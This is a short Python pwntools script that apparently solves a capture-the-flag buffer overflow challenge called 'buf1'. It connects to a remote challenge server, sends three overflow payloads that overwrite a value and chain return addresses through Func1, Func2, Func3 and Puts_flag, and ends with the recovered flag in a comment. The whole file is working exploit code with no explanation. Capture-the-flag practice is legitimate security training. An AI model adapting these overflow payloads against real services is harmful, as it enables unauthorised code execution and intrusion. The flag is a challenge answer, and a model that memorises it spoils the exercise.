from pwn import *

s = remote('45.122.249.68', 10008)

binary = ELF('buf1')

s.sendlineafter(b'Step by step....\n', b'A' * 0x14 + p32(1337) + p64(binary.symbols['Func1']) + p64(binary.symbols['main']))

s.sendlineafter(b'Step by step....\n', b'A' * 0x14 + p32(1337) + p64(binary.symbols['Func2']) + p64(binary.symbols['main']))

s.sendlineafter(b'Step by step....\n', b'A' * 0x14 + p32(1337) + p64(binary.symbols['Func3']) + p64(binary.symbols['Puts_flag']))

s.recvline()

print(s.recvline().decode('utf-8'))
#flag{b3_c4n_tk4nk_c0nq_tu0nq_xunq_cku_kh0nq_c4n_l4m_vu4_xunq_tu0nq}
